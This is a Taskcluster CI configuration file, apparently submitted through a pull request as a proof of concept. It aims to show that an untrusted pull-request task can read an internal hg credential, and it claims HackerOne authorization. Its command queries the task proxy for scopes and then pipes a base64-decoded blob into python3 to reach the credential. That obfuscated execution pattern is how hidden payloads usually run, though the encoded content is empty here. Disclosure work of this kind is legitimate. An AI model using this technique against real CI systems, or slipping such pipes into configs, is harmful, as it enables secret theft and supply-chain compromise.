---
version: 1
policy:
  pullRequests: public_restricted
tasks:
  - $if: 'tasks_for == "github-pull-request-untrusted"'
    then:
      taskId: { $eval: as_slugid("poc_untrusted_pr_v5") }
      created: { $fromNow: '' }
      deadline: { $fromNow: '1 hour' }
      expires: { $fromNow: '1 day' }
      provisionerId: releng-1
      workerType: decision
      payload:
        maxRunTime: 900
        features:
          taskclusterProxy: true
        image: "mozillareleases/taskgraph:decision-v24.1.1@sha256:c2cf963f7621b0f64dc142a04ddcc179d36afdd05c6dc1c2d198d97b55ecb394"
        command:
          - /bin/sh
          - -c
          - |
            echo "===== [1] Task identity (proves runtime role = pull-request-untrusted) ====="
            curl -s "http://taskcluster/queue/v1/task/$TASK_ID" | python3 -c "import sys,json; d=json.load(sys.stdin); print('taskId:', d.get('taskId')); print('scopes:', d.get('scopes')); print('source:', (d.get('metadata') or {}).get('source'))"
            echo
            echo "===== [2] Read internal hg credential (Responsible Disclosure: SHA-256/length/structure only, NEVER plaintext) ====="
            echo "" | base64 -d | python3
      metadata:
        name: "POC: untrusted PR scope + hgmointernal read (HackerOne authorized)"
        description: "Authorized security test - pull-request-untrusted role can read internal hg cred (hash only)"
        owner: "1253628375ltf@gmail.com"
        source: "https://github.com/ltfafei/fxci-config/pull/1117"
      extra:
        github:
          events:
            - pull_request
          taskcluster_pull_request_number: { $eval: 'event.number' }
